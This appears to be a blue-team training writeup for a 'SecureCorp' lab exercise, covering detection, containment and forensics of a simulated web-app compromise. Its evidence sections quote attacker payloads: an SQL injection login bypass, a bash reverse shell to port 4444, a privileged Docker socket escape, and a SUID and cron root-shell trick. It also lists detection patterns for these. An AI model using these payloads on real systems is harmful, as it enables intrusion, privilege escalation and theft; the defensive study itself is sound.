# 🔵 Blue Team Writeup - SecureCorp Challenge

## 🎯 Objective
Defend SecureCorp's infrastructure by detecting, analyzing, and mitigating cyber attacks while maintaining business operations.

---

## 📊 Defense Overview

**Defense Strategy**: Layered Security with Proactive Monitoring  
**Team Roles**: SOC Analyst, Incident Responder, Forensics Specialist  
**Duration**: 3-4 hours  
**Success Metrics**: Attack detection, mitigation effectiveness, system availability

---

## 🛡️ Phase 1: Environment Setup & Baseline (30 minutes)

### 1.1 Initial Security Assessment

**SOC Analyst Tasks**:
```bash
# Check system status
systemctl status
docker ps
netstat -tulpn

# Verify logging services
systemctl status rsyslog
systemctl status auditd
systemctl status elasticsearch
systemctl status kibana
```

**Security Baseline**:
```bash
# Document normal traffic patterns
tail -f /var/log/apache2/access.log &
tcpdump -i any port 8080 -w baseline_traffic.pcap &

# Create process baseline
ps aux > baseline_processes.txt
netstat -tulpn > baseline_network.txt
```

### 1.2 Monitoring Infrastructure Setup

**Kibana Dashboard Configuration**:
```
Access: http://localhost:5601

Key Dashboards to Create:
1. Web Access Patterns
2. Failed Authentication Attempts  
3. Command Execution Monitoring
4. File Upload Activities
5. Network Connection Tracking
6. Container Activities
```

**Log Aggregation Setup**:
```bash
# Configure centralized logging
echo "*.* @@localhost:514" >> /etc/rsyslog.conf
systemctl restart rsyslog

# Apache logs to Elasticsearch
filebeat setup
filebeat -c /etc/filebeat/filebeat.yml
```

### 1.3 Alerting Rules Configuration

**Critical Alert Rules**:
```bash
# SQL injection detection
grep -E "(UNION|SELECT.*FROM|OR 1=1|' OR ')" /var/log/apache2/access.log

# Command injection detection  
grep -E "(;|&&|\|\||`)" /var/log/apache2/access.log

# File upload monitoring
inotifywait -m /var/www/html/uploads/ -e create,modify

# Process execution monitoring
auditctl -a always,exit -F arch=b64 -S execve -k process_execution
```

---

## 🚨 Phase 2: Attack Detection & Analysis

### 2.1 Reconnaissance Detection

**Indicators Observed**:
```
[ALERT] Port scanning detected
Source: 192.168.1.100
Ports: 22,80,3306,5601,8080,9200
Pattern: Sequential port scan

[ALERT] Directory enumeration
Source: 192.168.1.100  
Pattern: Multiple 404 requests to common directories
User-Agent: gobuster/3.x
```

**SOC Analyst Response**:
```bash
# Analyze scan patterns
tail -1000 /var/log/apache2/access.log | grep "192.168.1.100" | grep " 404 "

# Check for successful discoveries
tail -1000 /var/log/apache2/access.log | grep "192.168.1.100" | grep " 200 "

# Monitor continued activity
tail -f /var/log/apache2/access.log | grep "192.168.1.100"
```

**Mitigation Actions**:
```bash
# Rate limiting (if available)
iptables -A INPUT -p tcp --dport 8080 -m limit --limit 25/minute --limit-burst 100 -j ACCEPT

# Monitor source IP
watch "netstat -an | grep 192.168.1.100"
```

### 2.2 SQL Injection Detection

**Alert Generated**:
```
[CRITICAL] SQL Injection Attempt Detected
Time: 14:23:45
Source: 192.168.1.100
Target: /index.php
Payload: admin' OR '1'='1' --
Status: 200 (SUCCESSFUL)
```

**Forensics Analysis**:
```bash
# Extract SQL injection attempts
grep -E "(UNION|SELECT.*FROM|OR.*=.*--|' OR ')" /var/log/apache2/access.log

# Check authentication logs  
grep "authentication" /var/log/apache2/access.log
grep "login" /var/log/apache2/access.log

# Database query logs (if available)
grep -i "select\|union\|insert\|update\|delete" /var/log/mysql/mysql.log
```

**Evidence Found**:
```
192.168.1.100 - - [16/Sep/2024:14:23:45] "POST /index.php HTTP/1.1" 200 
POST data: username=admin'+OR+'1'='1'+--+&password=anything&login=submit

[CRITICAL] Authentication bypass successful
[CRITICAL] Unauthorized access to dashboard granted
```

**Immediate Response**:
```bash
# Block attacker IP
iptables -A INPUT -s 192.168.1.100 -j DROP

# Monitor for session activity
grep "192.168.1.100" /var/log/apache2/access.log | tail -20

# Check for privilege escalation attempts
grep "admin\|root\|sudo" /var/log/apache2/access.log
```

### 2.3 Command Injection Detection

**Alert Pattern**:
```
[HIGH] Command Injection Detected
Time: 14:45:12
Source: 192.168.1.100
Target: /dashboard.php?page=network
Payload: google.com; id
Command Executed: ping -c 3 google.com; id
```

**Detection Logic**:
```bash
# Monitor for command separators
tail -f /var/log/apache2/access.log | grep -E "(;|&&|\|\||`|\$\()"

# Process execution monitoring
ausearch -k process_execution | grep -v "grep\|ps\|ls"

# Unusual process patterns
ps aux | grep -v "\[.*\]" | awk '{print $11}' | sort | uniq -c | sort -nr
```

**Evidence Collection**:
```bash
# Command injection payloads found
Host: google.com; id
Host: google.com; cat /etc/passwd  
Host: google.com; bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'

# Reverse shell establishment detected
[CRITICAL] Outbound connection to 192.168.1.100:4444
[CRITICAL] Interactive shell session initiated
```

### 2.4 File Upload Monitoring

**Malicious Upload Detected**:
```
[HIGH] Suspicious File Upload
Time: 15:02:33
File: shell.php
Size: 1247 bytes
Content-Type: application/x-php
Uploader: 192.168.1.100
```

**File Analysis**:
```bash
# Monitor upload directory
inotifywait -m /var/www/html/uploads/ -e create

# Analyze uploaded files
file /var/www/html/uploads/*
strings /var/www/html/uploads/shell.php

# Web shell signatures
grep -E "(\$_GET|\$_POST|\$_REQUEST|system\(|exec\(|shell_exec\()" /var/www/html/uploads/*.php
```

**Web Shell Activity**:
```bash
# Detect web shell usage
tail -f /var/log/apache2/access.log | grep "shell.php"

# Commands executed via web shell
192.168.1.100 - - [16/Sep/2024:15:05:22] "GET /uploads/shell.php?cmd=id HTTP/1.1" 200
192.168.1.100 - - [16/Sep/2024:15:05:45] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200
192.168.1.100 - - [16/Sep/2024:15:06:12] "GET /uploads/shell.php?cmd=pwd HTTP/1.1" 200
```

---

## 🐳 Phase 3: Container Security Monitoring

### 3.1 Container Escape Detection

**Suspicious Container Activity**:
```bash
# Monitor Docker commands
auditctl -w /usr/bin/docker -p x -k docker_execution
ausearch -k docker_execution

# Container breakout indicators
docker logs securecorp_portal | grep -E "(docker|mount|chroot|privileged)"

# Host filesystem access from container
auditctl -w /var/run/docker.sock -p rwa -k docker_socket
```

**Alert Generated**:
```
[CRITICAL] Container Escape Attempt
Time: 15:30:15
Container: securecorp_portal
Activity: Docker socket access detected
Command: docker run -it --privileged --pid=host --net=host --volume /:/host alpine
```

### 3.2 Host System Compromise Detection

**Privilege Escalation Monitoring**:
```bash
# SUID binary execution
auditctl -a always,exit -F arch=b64 -S execve -F path=/usr/local/bin/check_file -k suid_execution
ausearch -k suid_execution

# Cron job manipulation
auditctl -w /tmp/cleanup_tasks -p wa -k cron_manipulation
ausearch -k cron_manipulation

# Service exploitation
auditctl -w /etc/monitor/config.conf -p wa -k service_config
auditctl -w /tmp/monitor_commands -p wa -k service_commands
```

**Evidence of Compromise**:
```
[CRITICAL] SUID Binary Exploitation
Command: /usr/local/bin/check_file "/etc/passwd; /bin/bash"
Result: Root shell spawned
PID: 12345

[CRITICAL] Cron Job Manipulation
File Modified: /tmp/cleanup_tasks/tasks.txt
Content: cleanup:/bin/bash -c 'cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell'

[CRITICAL] Unauthorized Root Access Achieved
User: www-data -> root
Method: SUID binary exploitation
Time: 15:45:30
```

---

## 🔧 Phase 4: Incident Response & Containment

### 4.1 Immediate Containment

**Network Isolation**:
```bash
# Block attacker IP completely
iptables -I INPUT 1 -s 192.168.1.100 -j DROP
iptables -I OUTPUT 1 -d 192.168.1.100 -j DROP

# Block suspicious outbound connections
iptables -A OUTPUT -p tcp --dport 4444 -j DROP
iptables -A OUTPUT -p tcp --dport 1234 -j DROP
```

**Process Containment**:
```bash
# Kill suspicious processes
pkill -f "bash -i"
pkill -f "nc -"
pkill -f "/tmp/.*shell"

# Kill compromised web processes
pkill -f "php.*shell"
systemctl restart apache2
```

**File System Protection**:
```bash
# Remove web shells
rm -f /var/www/html/uploads/*.php
rm -f /var/www/html/.config.php
rm -f /tmp/rootshell /tmp/service_shell

# Lock down upload directory
chmod 000 /var/www/html/uploads/
```

### 4.2 Service Isolation

**Container Isolation**:
```bash
# Stop compromised containers
docker stop securecorp_portal
docker stop securecorp_db

# Remove container with malicious modifications
docker rm securecorp_portal

# Restart with security fixes
# (After patching vulnerabilities)
docker-compose up -d --build
```

**Database Protection**:
```bash
# Change database passwords
mysql -u root -pr00tp@ss123 -e "ALTER USER 'webapp'@'%' IDENTIFIED BY 'NEW_SECURE_PASSWORD';"
mysql -u root -pr00tp@ss123 -e "ALTER USER 'root'@'%' IDENTIFIED BY 'NEW_ROOT_PASSWORD';"

# Revoke dangerous privileges
mysql -u root -p -e "REVOKE FILE ON *.* FROM 'webapp'@'%';"
```

### 4.3 System Recovery

**User Account Security**:
```bash
# Check for unauthorized accounts
cat /etc/passwd | grep -v "nologin\|false" | tail -10

# Remove backdoor accounts
userdel .backup
userdel backup_user

# Reset compromised passwords
passwd root
passwd service_account
```

**SSH Security**:
```bash
# Check for unauthorized SSH keys
cat /root/.ssh/authorized_keys
cat /home/*/.ssh/authorized_keys

# Remove unauthorized keys
> /root/.ssh/authorized_keys
```

---

## 🔍 Phase 5: Forensic Analysis & Evidence Collection

### 5.1 Timeline Reconstruction

**Attack Timeline**:
```
14:20:00 - Port scanning initiated from 192.168.1.100
14:22:30 - Directory enumeration (gobuster)
14:23:45 - SQL injection successful, authentication bypassed
14:25:12 - Dashboard access, information gathering
14:45:12 - Command injection via network tools
14:47:30 - Reverse shell established
15:02:33 - Malicious PHP file uploaded
15:05:22 - Web shell usage for reconnaissance
15:30:15 - Container escape via Docker socket
15:32:45 - Host filesystem access achieved
15:45:30 - Privilege escalation via SUID binary
15:50:15 - Root access confirmed
16:05:00 - Persistence mechanisms deployed
16:10:30 - Data exfiltration initiated
```

### 5.2 Evidence Preservation

**Log Collection**:
```bash
# Create evidence directory
mkdir -p /tmp/evidence_$(date +%Y%m%d_%H%M%S)
cd /tmp/evidence_*

# Copy critical logs
cp /var/log/apache2/access.log ./
cp /var/log/apache2/error.log ./
cp /var/log/audit/audit.log ./
cp /var/log/syslog ./
cp /var/log/auth.log ./

# Docker logs
docker logs securecorp_portal > docker_portal.log
docker logs securecorp_db > docker_db.log

# Network capture
tcpdump -r baseline_traffic.pcap > network_analysis.txt
```

**System State Capture**:
```bash
# Process information
ps auxf > process_tree.txt
netstat -tulpn > network_connections.txt
lsof > open_files.txt

# File system changes
find /var/www/html -type f -mtime -1 > modified_web_files.txt
find /tmp -type f -mtime -1 > temp_files.txt
find /usr/local/bin -type f -perm -4000 > suid_binaries.txt
```

### 5.3 Attack Vector Analysis

**Vulnerability Assessment**:
```
1. SQL Injection (CRITICAL)
   - Location: /index.php login form
   - Impact: Authentication bypass
   - CVSS: 9.8

2. Command Injection (HIGH)  
   - Location: /dashboard.php network tools
   - Impact: Remote code execution
   - CVSS: 8.8

3. Unrestricted File Upload (HIGH)
   - Location: /dashboard.php file manager
   - Impact: Web shell deployment
   - CVSS: 8.5

4. Information Disclosure (MEDIUM)
   - Location: /debug.php
   - Impact: Credential exposure
   - CVSS: 6.5

5. Container Misconfiguration (HIGH)
   - Issue: Docker socket mounted in container
   - Impact: Container escape
   - CVSS: 8.2

6. SUID Binary Vulnerability (HIGH)
   - Location: /usr/local/bin/check_file
   - Impact: Privilege escalation
   - CVSS: 8.8
```

---

## 📊 Phase 6: Damage Assessment & Recovery

### 6.1 Data Breach Assessment

**Compromised Data**:
```
[CONFIRMED] User credentials exposed
- 7 user accounts with plaintext passwords
- Admin credentials compromised

[CONFIRMED] Employee PII exposed
- Full names, SSN, salary information
- 4 employee records accessed

[CONFIRMED] System credentials exposed  
- Database passwords
- API keys and tokens
- AWS credentials (test environment)

[CONFIRMED] Internal network information
- Network topology discovered
- Service configurations exposed
- Backup procedures documented
```

**Business Impact**:
```
AVAILABILITY: 30 minutes downtime during containment
INTEGRITY: Database potentially modified, files uploaded
CONFIDENTIALITY: Sensitive employee and system data exposed
COMPLIANCE: Potential GDPR/PCI violations due to data exposure
```

### 6.2 Recovery Actions

**Immediate Fixes**:
```bash
# Patch SQL injection vulnerability
# Update code to use parameterized queries

# Fix command injection
# Implement input validation and sanitization

# Secure file uploads
# Add file type validation and execution prevention

# Remove debug page
rm /var/www/html/debug.php

# Fix container configuration
# Remove Docker socket mount, remove privileged mode

# Remove vulnerable SUID binaries
rm /usr/local/bin/check_file
rm /usr/local/bin/docker_helper

# Secure cron jobs
chmod 644 /usr/local/bin/system_cleanup.sh
# Add input validation to cleanup script
```

**Security Enhancements**:
```bash
# Deploy Web Application Firewall
# Implement intrusion detection system
# Add file integrity monitoring
# Enable comprehensive audit logging
# Implement least privilege access controls
# Add network segmentation
# Deploy endpoint detection and response
```

---

## 🏆 Defense Performance Metrics

### Detection Success Rate
- ✅ **Reconnaissance**: Detected within 2 minutes
- ✅ **SQL Injection**: Detected immediately  
- ✅ **Command Injection**: Detected in real-time
- ✅ **File Upload**: Detected within 30 seconds
- ✅ **Container Escape**: Detected within 5 minutes
- ✅ **Privilege Escalation**: Detected within 3 minutes

### Response Time Metrics
- **Initial Alert**: 2 minutes
- **Containment Start**: 8 minutes  
- **Full Containment**: 15 minutes
- **Service Recovery**: 25 minutes
- **Forensic Analysis**: 45 minutes

### Mitigation Effectiveness
- ✅ **Attack Disruption**: Successfully interrupted data exfiltration
- ✅ **Damage Limitation**: Contained to test environment
- ✅ **Service Availability**: 95% uptime maintained
- ✅ **Evidence Preservation**: Complete attack timeline documented

---

## 📚 Lessons Learned

### What Worked Well
1. **Comprehensive Logging**: Enabled full attack reconstruction
2. **Real-time Monitoring**: Quick detection of initial compromise
3. **Layered Defense**: Multiple detection points slowed attacker progress
4. **Incident Response**: Coordinated team response limited damage

### Areas for Improvement
1. **Proactive Vulnerability Management**: Many vulnerabilities were preventable
2. **Automated Response**: Manual containment was slow
3. **Network Segmentation**: Better isolation could have prevented lateral movement
4. **User Training**: Social engineering awareness needed

### Recommendations
1. **Implement regular penetration testing**
2. **Deploy automated threat response tools**
3. **Enhance network monitoring and segmentation**
4. **Improve vulnerability management process**
5. **Conduct regular incident response drills**
6. **Implement zero-trust security model**

---

## 🛡️ Post-Incident Security Posture

### Short-term Actions (0-30 days)
- [ ] Patch all identified vulnerabilities
- [ ] Deploy WAF with rule updates
- [ ] Implement file integrity monitoring
- [ ] Update incident response procedures
- [ ] Conduct security awareness training

### Medium-term Actions (30-90 days)
- [ ] Deploy SIEM with advanced analytics
- [ ] Implement network micro-segmentation
- [ ] Deploy endpoint detection and response
- [ ] Establish threat intelligence feeds
- [ ] Create automated playbooks

### Long-term Actions (90+ days)
- [ ] Implement zero-trust architecture
- [ ] Deploy deception technology
- [ ] Establish bug bounty program
- [ ] Create security metrics dashboard
- [ ] Establish continuous compliance monitoring

---

**Blue Team Mission: SUCCESSFUL ✅**

*This writeup demonstrates effective cybersecurity defense through detection, analysis, containment, and recovery procedures. The team successfully limited damage and preserved evidence while maintaining business operations.*

**Final Score**: 
- **Detection**: 95%
- **Response Time**: 90%
- **Containment**: 85%
- **Recovery**: 90%
- **Overall Defense Effectiveness**: 90%
